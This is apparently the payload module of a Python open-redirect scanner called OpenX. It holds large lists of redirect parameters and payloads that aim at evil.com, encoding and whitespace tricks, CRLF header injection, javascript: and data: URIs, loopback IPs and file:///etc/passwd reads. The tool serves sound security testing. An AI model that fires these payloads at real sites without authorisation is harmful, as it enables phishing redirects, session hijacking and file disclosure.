"""
Payload management for OpenX scanner
"""

import os
import urllib.parse

class PayloadManager:
    """Manages payloads for open redirect testing"""
    
    def __init__(self, callback_url=None, custom_payloads_file=None, small_mode=False):
        """Initialize payload manager"""
        self.callback_url = callback_url
        self.custom_payloads_file = custom_payloads_file
        self.small_mode = small_mode
        
        # Common redirect parameters (extended list including real-world scenarios)
        self.all_redirect_params = [
            # Basic redirect parameters
            'url', 'redirect', 'return', 'returnurl', 'return_url',
            'next', 'goto', 'target', 'destination', 'dest',
            'continue', 'forward', 'location', 'site', 'to',
            'redirect_uri', 'callback', 'success_url', 'failure_url',
            'redirectUrl', 'returnUrl', 'nextUrl', 'targetUrl',
            'r', 'u', 'link', 'path', 'page', 'ref', 'referer',
            'exit', 'out', 'away', 'external', 'redir',
            'redirect_to', 'forward_to', 'go_to', 'jump_to',
            
            # OAuth and SSO parameters
            'redirect_uri', 'response_type', 'state', 'RelayState',
            'returnTo', 'return_to', 'returnURL', 'return_URL',
            'SAMLRequest', 'SAMLResponse', 'idp_return_to',
            
            # Enterprise application parameters
            'returnTo', 'back_to', 'continue_to', 'success_redirect',
            'error_redirect', 'cancel_url', 'return_path', 'next_page',
            'landing_page', 'home_url', 'dashboard_url', 'profile_url',
            
            # Payment and e-commerce parameters
            'success_url', 'cancel_url', 'return_url', 'notify_url',
            'callback_url', 'ipn_url', 'webhook_url', 'confirmation_url',
            
            # Email and notification parameters
            'confirm_url', 'verify_url', 'activation_url', 'reset_url',
            'unsubscribe_url', 'click_url', 'track_url',
            
            # File and upload parameters
            'upload_success', 'download_url', 'file_url', 'next_url',
            'continue_url', 'finish_url', 'complete_url',
            
            # Form and submission parameters
            'submit_redirect', 'form_redirect', 'post_redirect',
            'action_redirect', 'handler_redirect', 'processor_redirect',
            
            # API and service parameters
            'api_redirect', 'service_url', 'endpoint_url', 'webhook',
            'post_back', 'ping_back', 'notify', 'alert_url',
            
            # Mobile and app parameters
            'app_redirect', 'mobile_redirect', 'deep_link', 'universal_link',
            'custom_scheme', 'intent_url', 'fallback_url',
            
            # Specialized parameters
            'first', 'second', 'third', 'chain', 'hop', 'intermediate'
        ]
        
        # Small mode uses only most common parameters
        self.common_redirect_params = [
            'url', 'redirect', 'return', 'next', 'goto', 'target',
            'redirect_uri', 'callback', 'r', 'u'
        ]
    
    def get_parameters_to_test(self, existing_params=None):
        """Get list of parameters to test"""
        existing_params = existing_params or []
        
        if self.small_mode:
            base_params = self.common_redirect_params
        else:
            base_params = self.all_redirect_params
        
        # Always test existing parameters
        params_to_test = list(set(base_params + list(existing_params)))
        
        return params_to_test
    
    def get_basic_payloads(self):
        """Get basic open redirect payloads"""
        callback = self.callback_url or "http://evil.com"
        
        payloads = [
            # Basic HTTP/HTTPS redirects
            "http://evil.com",
            "https://evil.com",
            callback,
            
            # Protocol-relative URLs
            "//evil.com",
            "///evil.com",
            "////evil.com",
            
            # URL encoding variations
            "http%3A%2F%2Fevil.com",
            "https%3A%2F%2Fevil.com",
            "%2F%2Fevil.com",
            "%2F%2F%2Fevil.com",
            
            # Double URL encoding
            "%252F%252Fevil.com",
            "http%253A%252F%252Fevil.com",
            "https%253A%252F%252Fevil.com",
            
            # Unicode bypasses
            "http://evil.com\u2044",
            "http://evil.com\u2215",
            "http://evil.com\uFF0F",
            
            # Mixed encoding
            "http:/\\/evil.com",
            "http:\\/\\/evil.com",
            "http:/\\evil.com",
            
            # Subdomain confusion
            "http://subdomain.evil.com",
            "https://www.evil.com",
            
            # Path traversal attempts
            "../../../evil.com",
            "..\\..\\..\\evil.com",
            
            # Null byte injection
            "http://evil.com%00",
            "http://evil.com\x00",
            
            # CRLF injection
            "http://evil.com%0d%0a",
            "http://evil.com\r\n",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            "javascript:window.location='http://evil.com'",
            
            # Data protocol
            "data:text/html,<script>window.location='http://evil.com'</script>",
            
            # FTP and other protocols
            "ftp://evil.com",
            "file://evil.com",
            "mailto:test@evil.com"
        ]
        
        return payloads
    
    def get_advanced_payloads(self):
        """Get advanced bypass payloads"""
        callback = self.callback_url or "http://evil.com"
        
        advanced_payloads = [
            # Domain validation bypasses
            "http://evil.com/legitimate-site.com",
            "http://legitimate-site.com.evil.com",
            "http://evil.com@legitimate-site.com",
            "http://legitimate-site.com@evil.com",
            "http://legitapp.com.evil.com",
            "http://evil.com/legitapp.com",
            "http://legitapp.com@evil.com",
            
            # IP address variations
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://localhost",
            
            # Octal/Hex IP bypasses
            "http://0177.0.0.1",  # 127 in octal
            "http://0x7f.0.0.1",   # 127 in hex
            "http://2130706433",   # 127.0.0.1 as decimal
            "http://017700000001", # Full octal
            "http://0x7f000001",   # Full hex
            
            # Unicode domain bypasses (simplified to avoid encoding issues)
            "http://evi1.com",  # Number substitution
            "http://3vil.com",  # Number substitution
            
            # IDN homograph attacks (simplified)
            "http://goog1e.com", # Number substitution
            "http://app1e.com",  # Number substitution
            "http://micr0soft.com", # Number substitution
            
            # Port confusion
            "http://evil.com:80",
            "https://evil.com:443",
            "http://evil.com:8080",
            "http://evil.com:3000",
            "http://evil.com:5000",
            
            # Whitespace bypasses
            "http://evil.com ",
            " http://evil.com",
            "http://evil.com\t",
            "http://evil.com\r\n",
            "http://evil.com\n",
            "\thttp://evil.com",
            
            # Case sensitivity bypasses
            "HTTP://EVIL.COM",
            "Http://Evil.Com",
            "hTTp://eViL.cOm",
            "HTTPS://EVIL.COM",
            "Http://EVIL.com",
            
            # Fragment bypasses
            "http://evil.com#legitimate-site.com",
            "http://evil.com/#/legitimate-site.com",
            "http://evil.com#legitapp.com",
            "http://evil.com/?#legitapp.com",
            
            # Query parameter confusion
            "http://evil.com?legitimate-site.com",
            "http://evil.com?redirect=legitimate-site.com",
            "http://evil.com?legitapp.com",
            "http://evil.com?host=legitapp.com",
            
            # CRLF injection payloads
            "http://evil.com%0d%0aSet-Cookie: session=hijacked",
            "http://evil.com%0a%0dLocation: http://evil.com",
            "http://evil.com\r\nLocation: http://attacker.com",
            
            # Null byte injection
            "http://evil.com%00.legitapp.com",
            "http://legitapp.com%00.evil.com",
            "http://evil.com\x00legitapp.com",
            
            # Advanced bypass techniques from 2025 report
            # HTTP scheme blacklist bypasses
            "/%0A/evil.com",  # newline character
            "/%0D/evil.com",  # carriage return  
            "/%09/evil.com",  # tab character
            "+/evil.com",     # plus character
            "///evil.com",    # triple slash
            "\\\\evil.com",   # backslash variation
            "http:evil.com",  # missing slashes
            "https:evil.com", # missing slashes
            
            # Domain validation bypasses with encoding
            "http://legitapp.com%00evil.com",     # null byte domain bypass
            "http://legitapp.com%0Aevil.com",     # newline domain bypass
            "http://legitapp.com%0Devil.com",     # carriage return domain bypass
            "http://legitapp.com%09evil.com",     # tab domain bypass
            "http://legitapp.com°evil.com",       # non-ASCII character bypass
            
            # Path traversal and double encoding (CVE-2025-4123 style)
            "..%2F/evil.com",                     # double-encoded path traversal
            "..%252F/evil.com",                   # triple-encoded path traversal
            "http://evil.com/..%2F",              # path traversal in URL
            "http://evil.com/..%252F",            # double-encoded path traversal
            
            # Advanced JavaScript protocol bypasses for DOM-based redirects
            "JavaScript:alert(1)",               # case variation
            "JAVASCRIPT:alert(1)",               # uppercase
            "ja%20vascri%20pt:alert(1)",         # URL-encoded spaces
            "jav%0Aascri%0Apt:alert(1)",         # newline injection
            "jav%0Dascri%0Dpt:alert(1)",         # carriage return injection
            "jav%09ascri%09pt:alert(1)",         # tab injection
            "%19javascript:alert(1)",            # advanced regex bypass
            "javascript://%0Aalert(1)",          # newline comment bypass
            
            # Userinfo bypasses (@ character tricks)
            "http://legitapp.com@evil.com",       # userinfo bypass
            "https://legitapp.com@evil.com",      # userinfo bypass HTTPS
            "ftp://legitapp.com@evil.com",        # userinfo bypass FTP
            
            # Backslash bypasses
            "http:\\\\evil.com",
            "http:\\/\\/evil.com", 
            "http:/\\evil.com",
            "\\\\evil.com",
            "\\/\\/evil.com",
            
            # OAuth specific bypasses
            "http://legitapp.com.evil.com/oauth/callback",
            "http://evil.com/oauth/callback?host=legitapp.com",
            "http://evil.com/legitapp.com/oauth/callback",
            
            # Enterprise app bypasses
            "//evil.com/dashboard",
            "///evil.com/grafana",
            "http://evil.com/api/v1/callback",
            "https://evil.com/admin/login",
            
            # Mobile and deep link bypasses  
            "evil-app://redirect?url=http://evil.com",
            "http://evil.com/mobile/redirect",
            "intent://evil.com#Intent;scheme=http;end",
            
            # File protocol bypasses
            "file:///etc/passwd",
            "file://evil.com/etc/passwd",
            "file:///c:/windows/system32/",
            
            # Data protocol bypasses
            "data:text/html,<script>location='http://evil.com'</script>",
            "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovL2V2aWwuY29tJzwvc2NyaXB0Pg==",
            
            # JavaScript protocol variations
            "javascript:window.location='http://evil.com'",
            "javascript:location.href='http://evil.com'", 
            "javascript:document.location='http://evil.com'",
            "javascript:window.open('http://evil.com')",
            "javascript://evil.com/%0Alocation.href='http://evil.com'",
            
            # VBScript (legacy IE)
            "vbscript:window.location='http://evil.com'",
            "vbscript:location.href='http://evil.com'",
        ]
        
        return advanced_payloads
    
    def get_encoding_bypasses(self):
        """Get encoding-based bypass payloads"""
        bypasses = []
        base_payload = "http://evil.com"
        
        # Single URL encoding
        bypasses.append(urllib.parse.quote(base_payload))
        bypasses.append(urllib.parse.quote(base_payload, safe=''))
        
        # Double URL encoding
        single_encoded = urllib.parse.quote(base_payload)
        bypasses.append(urllib.parse.quote(single_encoded))
        
        # HTML entity encoding
        bypasses.append("http&#58;//evil&#46;com")
        bypasses.append("http&#x3A;//evil&#x2E;com")
        
        # Mixed encoding combinations
        bypasses.extend([
            "http%3A//evil.com",
            "http:%2F%2Fevil.com",
            "http://%65vil.com",  # 'e' encoded
            "http://evil%2Ecom",  # '.' encoded
        ])
        
        return bypasses
    
    def load_custom_payloads(self):
        """Load payloads from custom file"""
        if not self.custom_payloads_file:
            return []
        
        try:
            with open(self.custom_payloads_file, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f.readlines()]
                return [p for p in payloads if p and not p.startswith('#')]
        except FileNotFoundError:
            print(f"Warning: Custom payload file not found: {self.custom_payloads_file}")
            return []
        except Exception as e:
            print(f"Error loading custom payloads: {str(e)}")
            return []
    
    def get_payloads(self):
        """Get all payloads for testing"""
        payloads = []
        
        # Add basic payloads
        payloads.extend(self.get_basic_payloads())
        
        # Add advanced payloads if not in small mode
        if not self.small_mode:
            payloads.extend(self.get_advanced_payloads())
            payloads.extend(self.get_encoding_bypasses())
        
        # Add custom payloads
        custom_payloads = self.load_custom_payloads()
        payloads.extend(custom_payloads)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        return unique_payloads
